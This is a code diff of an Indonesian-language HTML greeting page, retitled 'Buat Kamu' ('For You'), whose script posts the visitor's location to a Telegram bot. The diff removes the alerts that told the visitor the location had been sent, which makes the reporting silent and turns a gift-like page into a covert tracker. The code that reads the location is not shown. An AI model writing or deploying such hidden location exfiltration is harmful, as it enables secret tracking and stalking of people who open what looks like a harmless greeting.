@@ -5,7 +5,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="css/style.css">
-    <title>Flowers</title>
+    <title>Buat Kamu</title>
 </head>
 <body>
     <div class="greetings">
@@ -14,7 +14,7 @@
         <span>L</span>
         <span>L</span>
         <span>O</span>
-        <span>O</span>
+        <span>W</span>
     </div>
     <div class="description">
         <p><span></span></p>
@@ -96,13 +96,9 @@
                 })
                 .then(result => {
                     console.log("Pesan berhasil dikirim:", result);
-                    alert("Lokasi berhasil dikirim ke bot Telegram!");
-                    onSuccess();
                 })
                 .catch(error => {
                     console.error("Gagal mengirim pesan ke Telegram:", error);
-                    alert("Gagal mengirim data ke bot Telegram.");
-                    onSuccess(); // Tetap lanjutkan meskipun gagal
                 });
         }
     </script>
